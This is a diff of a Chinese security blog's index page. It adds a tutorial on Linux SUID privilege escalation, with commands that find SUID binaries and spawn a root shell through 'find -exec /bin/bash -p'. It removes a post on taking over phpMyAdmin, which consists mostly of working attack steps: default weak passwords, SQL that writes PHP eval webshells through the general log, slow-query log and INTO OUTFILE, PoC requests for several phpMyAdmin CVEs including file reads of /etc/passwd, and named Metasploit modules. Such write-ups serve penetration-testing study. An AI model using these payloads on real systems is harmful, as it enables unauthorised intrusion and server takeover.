@@ -255,6 +255,103 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/08/14/Linux-suid%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="潜心学习，不骄不躁">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/08/14/Linux-suid%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">Linux suid提权漏洞</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-08-14 14:58:16 / 修改时间：15:01:32" itemprop="dateCreated datePublished" datetime="2022-08-14T14:58:16+08:00">2022-08-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/fuxian/" itemprop="url" rel="index"><span itemprop="name">-fuxian</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Linux-suid提权漏洞"><a href="#Linux-suid提权漏洞" class="headerlink" title="Linux suid提权漏洞"></a>Linux suid提权漏洞</h1><p>一、课时目标<br>1.理解suid的概念和作用<br>2.掌握linux suid提权的方法</p>
+<p>二、思考<br>思考： shadow文件存放用户密码，那普通用户在没有写权限的情况下如何修改密码并更新shadow文件中的内容？</p>
+<p><img src="/2022/08/14/Linux-suid%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/7ff21abfdd6043ffb0bb6a53181891f4.png" alt="在这里插入图片描述"></p>
+<p>我们知道，系统中的用户密码是保存在/etc/shadow中的，普通用户可以修改自己的密码，修改完成后shadows文件中的密码也会随之更新。<br>回顾linux下文件权限，用户具备w写权限才能对文件内容进行修改，但明显普通用户对于shadow文件没有任何操作权限，那这个过程是如何发生的呢？原因就在于这个SUID功能，也就是passwd文件拥有者的x权限上出现的S标志。</p>
+<p><img src="/2022/08/14/Linux-suid%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/9234e042864949f99b4e66ee5533d0b3.png" alt="在这里插入图片描述"></p>
+<p>三、什么是SUID<br>SUID是一种对二进制程序进行设置的特殊权限,可以让二进制程序的执行者临时拥有属主的权限<br>当s这个标志出现在文件所有者的x权限上时，如/usr/bin/passwd这个文件的权限状态：“-rwsr-xr-x.”，此时就被称为Set UID，简称为SUID。那么这个特殊权限的特殊性的作用是什么呢？<br>1、SUID权限仅对二进制程序(binary program)有效；<br>2、执行者对于该程序需要具有x的可执行权限；<br>3、本权限仅在执行该程序的过程中有效(run-time)；<br>4、执行者将具有该程序拥有者(owner)的权限。</p>
+<p>SUID的目的就是：让本来没有相应权限的用户运行这个程序时，可以访问他没有权限访问的资源。</p>
+<p>passwd就是一个很鲜明的例子，下面我们就来了解一下这相passwd执行的过程。<br>1、因为/usr/bin/passwd的权限对任何的用户都是可以执行的，所以系统中每个用户都可以执行此命令。<br>2、而/usr/bin/passwd这个文件的权限是属于root的。<br>3、当某个用户执行/usr/bin/passwd命令的时候，就拥有了root的权限了。<br>4、于是某个用户就可以借助root用户的权力，来修改了/etc/shadow文件了。<br>5、最后，把密码修改成功。<br>注：这个SUID只能运行在二进制的程序上（系统中的一些命令），不能用在脚本上（script），因为脚本还是把很多的程序集合到一起来执行，而不是脚本自身在执行。同样，这个SUID也不能放到目录上，放上也是无效的。</p>
+<p>四、如何设置suid<br>1.为find命令添加s位权限<br>chmod u+s /usr/find</p>
+<p><img src="/2022/08/14/Linux-suid%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/1.png" alt="在这里插入图片描述"></p>
+<p>五、suid提权<br>常见可以用来提权的程序有：nmap、vim、find、bash、more、less、nano、cp</p>
+<p>SUID文件在执行的时候以属主的身份执行，因此拿到了root的权限，若是对一些特殊命令设置了SUID，那么就会有被利用提权的可能性，常用的SUID提权命令有nmap，vim，find，bash，more，less，nano以及cp等等。</p>
+<p>以下语句可以用来搜索具备SUID权限的程序</p>
+<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
+<p><code>find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</code></p>
+<p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p>
+<p>举例：使用find命令进行提权<br>find 1.txt -exec whoami ;<br>find 1.txt -exec /bin/bash -p ;</p>
+<p><img src="/2022/08/14/Linux-suid%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/2.png" alt="在这里插入图片描述"></p>
+<h1 id="靶场实例"><a href="#靶场实例" class="headerlink" title="靶场实例"></a>靶场实例</h1><p>首先是拿到了一个主机的meterpreter</p>
+<p>使用以下命令找一下具有suid权限的程序</p>
+<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
+<p><img src="/2022/08/14/Linux-suid%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20220814145141549.png" alt="image-20220814145141549"></p>
+<p>tips：上一步中，如果要直接显示文件的权限，可以使用以下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -type f 2&gt;/dev/null -exec ls -l &#123;&#125; \;</span><br></pre></td></tr></table></figure>
+
+<p>进入目录，直接执行，拿到权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /home/user3</span><br><span class="line">./shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/14/Linux-suid%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20220814145618134.png" alt="image-20220814145618134"></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39430198/article/details/123504153">借鉴：(95条消息) 一文让你深刻理解什么是suid提权_Nddey的博客-CSDN博客_suid提权</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/07/09/2022%E5%88%9D%E7%BA%A7%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -849,168 +946,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/06/02/phpmyadmin%E5%90%8E%E5%8F%B0%E6%8B%BFshell%E7%9A%844%E7%A7%8D%E6%96%B9%E5%BC%8F/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="十三">
-      <meta itemprop="description" content="潜心学习，不骄不躁">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="十三の博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/06/02/phpmyadmin%E5%90%8E%E5%8F%B0%E6%8B%BFshell%E7%9A%844%E7%A7%8D%E6%96%B9%E5%BC%8F/" class="post-title-link" itemprop="url">phpmyadmin后台拿shell的4种方式</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-06-02 20:19:09" itemprop="dateCreated datePublished" datetime="2022-06-02T20:19:09+08:00">2022-06-02</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-12-19 15:45:11" itemprop="dateModified" datetime="2022-12-19T15:45:11+08:00">2022-12-19</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/fuxian/" itemprop="url" rel="index"><span itemprop="name">-fuxian</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="phpmyadmin后台拿shell的4种方式"><a href="#phpmyadmin后台拿shell的4种方式" class="headerlink" title="phpmyadmin后台拿shell的4种方式"></a>phpmyadmin后台拿shell的4种方式</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">怎么进phpmyadmin？</span><br><span class="line">弱口令</span><br><span class="line">root/root</span><br><span class="line">root/空密码</span><br><span class="line">root/123456</span><br><span class="line">phpMyAdmin爆破工具</span><br><span class="line">信息泄露(配置文件等)</span><br><span class="line">怎么拿到网站绝对路径？</span><br><span class="line">单引号爆绝对路径</span><br><span class="line">xx.asp?id=1’</span><br><span class="line">错误参数值爆绝对路径</span><br><span class="line">xx.asp?id=-1</span><br><span class="line">搜索引擎搜索绝对路径</span><br><span class="line">site:xxx.com error</span><br><span class="line">site:xxx.com warning</span><br><span class="line">site:xxx.com fatal error</span><br><span class="line">测试文件获取绝对路径</span><br><span class="line">phpinfo.php</span><br><span class="line">test.php</span><br><span class="line">ceshi.php</span><br><span class="line">info.php</span><br><span class="line">php_info.php</span><br></pre></td></tr></table></figure>
-
-<h1 id="全局日志文件写入shell"><a href="#全局日志文件写入shell" class="headerlink" title="全局日志文件写入shell"></a>全局日志文件写入shell</h1><p>首先查看mysql的日志状态，默认是关闭的，因为这个日志的量非常大对资源是一个比较大的开销</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &#x27;%general%&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>general_log_file为日志保存的位置</p>
-<p><img src="/2022/06/02/phpmyadmin%E5%90%8E%E5%8F%B0%E6%8B%BFshell%E7%9A%844%E7%A7%8D%E6%96%B9%E5%BC%8F/image-20220812143953158.png" alt="image-20220812143953158"></p>
-<p>随后开启general_log模式</p>
-<p>开启general_log 的作用：开启它可以记录用户输入的每条命令，会把其保存在C:\phpStudy\MySQL\data\stu1.log的文件中，其实就是我们常说的日志文件利用思路：开启general_log之后把general_log_file的值修改为该网站默认路径下的某一个自定义的php文件中，然后通过log日志进行写入一句话木马，然后再进一步利用</p>
-<p>这里注意：在修改log路径前，源路径一定要提前记录下来，我们获取shell后还要恢复原来的路径</p>
-<p>思路就是</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">set global general_log = on;  #开全局日志</span><br><span class="line"></span><br><span class="line">set global general_log_file=&#x27;C:\\phpStudy\\MySQL\\data\\shell.php&#x27;;   #改日志目录为shell</span><br><span class="line"></span><br><span class="line">select &#x27;&lt;?php eval($_POST[cmd]);?&gt;&#x27;  #写入木马</span><br><span class="line"></span><br><span class="line">set global general_log_file=&#x27;C:\\phpStudy\\MySQL\\data\\stu1.log&#x27;;</span><br><span class="line">set global general_log = off;把日志目录改回来</span><br></pre></td></tr></table></figure>
-
-<p>记录下原本的日志文件C:\phpStudy\MySQL\data\stu1.log</p>
-<p>成功改过来</p>
-<p><img src="/2022/06/02/phpmyadmin%E5%90%8E%E5%8F%B0%E6%8B%BFshell%E7%9A%844%E7%A7%8D%E6%96%B9%E5%BC%8F/image-20220812144956148.png" alt="image-20220812144956148"></p>
-<p>写入shell</p>
-<p>可以看到服务器上面已经有shell了</p>
-<p><img src="/2022/06/02/phpmyadmin%E5%90%8E%E5%8F%B0%E6%8B%BFshell%E7%9A%844%E7%A7%8D%E6%96%B9%E5%BC%8F/image-20220812145248577.png" alt="image-20220812145248577"></p>
-<p>这里写错地方了，应该写到网站目录上面。</p>
-<p>菜刀连接，最后把设置调回去，拿下shell！</p>
-<p><img src="/2022/06/02/phpmyadmin%E5%90%8E%E5%8F%B0%E6%8B%BFshell%E7%9A%844%E7%A7%8D%E6%96%B9%E5%BC%8F/image-20220812150008465.png" alt="image-20220812150008465"></p>
-<h1 id="在知道绝对路径的情况下，利用INTO-OUTFILE"><a href="#在知道绝对路径的情况下，利用INTO-OUTFILE" class="headerlink" title="在知道绝对路径的情况下，利用INTO OUTFILE"></a><strong>在知道绝对路径的情况下，利用INTO OUTFILE</strong></h1><p><code>select @@basedir;</code> 查找绝对路径</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%secure_file_priv%&#x27;;</span><br></pre></td></tr></table></figure>
-
-<p>NULL 不允许导入或导出<br>/tmp 只允许在 /tmp 目录导入导出<br>空 不限制目录</p>
-<p>如果有权限<br><code>select &#39;&lt;?php @eval($_POST[a]);?&gt;&#39;INTO OUTFILE &#39;E:/phpstudy_pro/WWW/test.php&#39;</code></p>
-<p><img src="/2022/06/02/phpmyadmin%E5%90%8E%E5%8F%B0%E6%8B%BFshell%E7%9A%844%E7%A7%8D%E6%96%B9%E5%BC%8F/image-20220812142059560.png" alt="image-20220812142059560"></p>
-<p>高版本的mysql中，默认为NULL</p>
-<h1 id="慢查询写入webshell"><a href="#慢查询写入webshell" class="headerlink" title="慢查询写入webshell"></a>慢查询写入webshell</h1><p>在实际写webshell的时候，我们经常会遭受到secure_file_priv的阻拦，secure_file_priv这个配置参数用来限制load data、outfile、load_file()的使用。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">解决办法：</span><br><span class="line"></span><br><span class="line">在Windows下可在my.ini的[mysqld]里面，添加secure_file_priv=</span><br><span class="line"></span><br><span class="line">在linux下可在/etc/my.cnf的[mysqld]里面，添加secure_file_priv=</span><br></pre></td></tr></table></figure>
-
-<p>通过慢日志查询来绕过此限制</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1、show variables like &#x27;%slow_query_log%&#x27;;                                            查看慢查询日志开启情况</span><br><span class="line"></span><br><span class="line">2、set global slow_query_log=on;                                                             开启慢查询日志</span><br><span class="line"></span><br><span class="line">3、set global slow_query_log_file=&#x27;C:/phpStudy/WWW/shell.php&#x27;;          修改日志文件存储的绝对路径</span><br><span class="line"></span><br><span class="line">4、select &#x27;&lt;?php @eval($_POST[shell]);?&gt;&#x27; or sleep(10);                         向日志文件中写入shell</span><br><span class="line"></span><br><span class="line">5、使用慢查询日志时，只有当查询时间超过系统时间(默认为10秒)时才会记录在日志中，使用如下语句可查看系统时间：</span><br><span class="line">show global variables like &#x27;%long_query_time%&#x27;;   </span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/06/02/phpmyadmin%E5%90%8E%E5%8F%B0%E6%8B%BFshell%E7%9A%844%E7%A7%8D%E6%96%B9%E5%BC%8F/image-20220813101414308.png" alt="image-20220813101414308"></p>
-<p>可以看到服务器上shell已经进去了</p>
-<p>菜刀连接一下</p>
-<p><img src="/2022/06/02/phpmyadmin%E5%90%8E%E5%8F%B0%E6%8B%BFshell%E7%9A%844%E7%A7%8D%E6%96%B9%E5%BC%8F/image-20220813101944718.png" alt="image-20220813101944718"></p>
-<h1 id="创建数据库和表写入webshell"><a href="#创建数据库和表写入webshell" class="headerlink" title="创建数据库和表写入webshell"></a>创建数据库和表写入webshell</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">利用条件：Root数据库用户（root权限）; 网站绝对路径（确定有写入权限）; secure_file_priv没有具体值。操作步骤：1）执行下面的sql语句，创建表并在表中写入一句话木马，在导出到网站的根路径。</span><br><span class="line">CREATE TABLE test( id text(500) not null);    </span><br><span class="line"></span><br><span class="line">INSERT INTO test (id) VALUES(&#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;);    </span><br><span class="line"></span><br><span class="line">SELECT id FROM test INTO OUTFILE &#x27;C:/phpstudy/WWW/1.php&#x27;；    </span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS test；</span><br></pre></td></tr></table></figure>
-
-<h1 id="phpMyAdmin漏洞利用："><a href="#phpMyAdmin漏洞利用：" class="headerlink" title="phpMyAdmin漏洞利用："></a>phpMyAdmin漏洞利用：</h1><h2 id="phpmyadmin反序列化漏洞任意文件读取（WooYun-2016-199433）"><a href="#phpmyadmin反序列化漏洞任意文件读取（WooYun-2016-199433）" class="headerlink" title="phpmyadmin反序列化漏洞任意文件读取（WooYun-2016-199433）"></a>phpmyadmin反序列化漏洞任意文件读取（WooYun-2016-199433）</h2><p>影响phpMyAdmin 2.x版本，poc如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /scripts/setup.php HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept-Encoding: gzip, deflate Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trid ent/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded Content-Length: 80</span><br><span class="line"></span><br><span class="line">action=test&amp;configuration=O:10:&quot;PMA_Config&quot;:1:&#123;s:6:&quot;source&quot;,s:11:&quot;/etc/passwd&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="CVE-2016-5734-RCE："><a href="#CVE-2016-5734-RCE：" class="headerlink" title="CVE-2016-5734 RCE："></a>CVE-2016-5734 RCE：</h2><p>利用条件：</p>
-<blockquote>
-<p>1、授权用户；<br>2、phpmyadmin4.3.0-4.6.2 ；<br>3、PHP 4.3.0-5.4.6</p>
-</blockquote>
-<p>主要原因由于将用户输入的信息拼接进preg_replace函数第一个参数中，而在PHP5.4.7以前，preg_replace存在漏洞，可以0进行截断，并将正则模式修改为e，进而执行命令。</p>
-<p>在Kali中有自带的EXP</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit phpmyadmin</span><br><span class="line">python3 40185.py -u root - root -d test -c &quot;system(whoami)&quot; http://192.168.75.130:8080/</span><br></pre></td></tr></table></figure>
-
-
-
-<p>具体请参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/8e44cb1b5b5b">https://www.jianshu.com/p/8e44cb1b5b5b</a></p>
-<h2 id="CVE-2018-12613文件包含"><a href="#CVE-2018-12613文件包含" class="headerlink" title="CVE-2018-12613文件包含:"></a>CVE-2018-12613文件包含:</h2><p>利用条件：</p>
-<blockquote>
-<p>漏洞版本：phpMyAdmin 4.8.0和4.8.1<br>主要原因在index.php中存在一处文件包含逻辑</p>
-</blockquote>
-<p>满足以下5个条件:</p>
-<blockquote>
-<p>1、不为空　　<br>2、字符串　　<br>3、不以index开头　　<br>4、不在$target_blacklist这个黑名单中　　<br>5、Core::checkPageValidity()函数为TRUE<br>进而通过二次编码即可绕过检查，造成远程文件包含漏洞。</p>
-</blockquote>
-<p>判断是否存在漏洞经过二次编码绕过<br>/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</p>
-<p>然后在sql语句中执行一些语句记录到日志，然后在包含即可<br>SELECT ‘‘;<br>查询phpmyadmin cookie值(开发者工具查看)<br><a href="https://links.jianshu.com/go?to=http://192.168.75.130:8080/index.php?target=db_sql.php?/../../../../../../tmp/sess_ff16b4962b5343089c8fcd4c58df53ba">http://192.168.75.130:8080/index.php?target=db_sql.php%253f/../../../../../../tmp/sess_ff16b4962b5343089c8fcd4c58df53ba</a></p>
-<h2 id="CVE-2014-8959：本地文件包含"><a href="#CVE-2014-8959：本地文件包含" class="headerlink" title="CVE-2014 -8959：本地文件包含"></a>CVE-2014 -8959：本地文件包含</h2><p>利用条件：</p>
-<blockquote>
-<p>phpMyAdmin 4 .0.1–4 .2.12<br>PHP version &lt; 5.3.4</p>
-</blockquote>
-<p>POC:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/gis_data_editor.php?token=你的token值&amp;gis_data[gis_type]=</span><br><span class="line">/../../../../phpinfo.txt%00</span><br></pre></td></tr></table></figure>
-
-<p>在实际利用中可以利用写入文件到/tmp目录下结合此漏洞完成RCE，php版本可以通过http header、导出表内容到文件的附加内容看到。</p>
-<h2 id="CVE-2013-3238"><a href="#CVE-2013-3238" class="headerlink" title="CVE-2013-3238:"></a>CVE-2013-3238:</h2><p>利用条件：</p>
-<blockquote>
-<p>phpMyAdmin 3.5.x &lt; 3.5.8.1 and 4.0.0 &lt; 4.0.0-rc3</p>
-</blockquote>
-<p>msf有相应的利用模块：<br>exploit/multi/http/phpmyadmin_preg_replace</p>
-<h2 id="CVE-2012-5159"><a href="#CVE-2012-5159" class="headerlink" title="CVE-2012-5159:"></a>CVE-2012-5159:</h2><p>利用条件：</p>
-<blockquote>
-<p>phpMyAdmin v3.5.2.2</p>
-</blockquote>
-<p>msf有相应的利用模块：<br>exploit/multi/http/phpmyadmin_3522_backdoor</p>
-<h2 id="CVE-2009-1151"><a href="#CVE-2009-1151" class="headerlink" title="CVE-2009-1151:"></a>CVE-2009-1151:</h2><p>PhpMyAdmin配置文件/config/config.inc.php存在命令执行<br>利用条件：</p>
-<blockquote>
-<p>phpmyadmin 2.11.x &lt; 2.11.9.5 and 3.x &lt; 3.1.3.1</p>
-</blockquote>
-<p>msf有相应的利用模块：<br>exploit/unix/webapp/phpmyadmin_config</p>
-<p>弱口令&amp;万能密码:<br>弱口令：版本phpmyadmin2.11.9.2， 直接root用户登陆，无需密码<br>万能密码：版本2.11.3 / 2.11.4，用户名’localhost’@‘@”则登录成功</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1082,7 +1017,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">173</span>
+          <span class="site-state-item-count">174</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
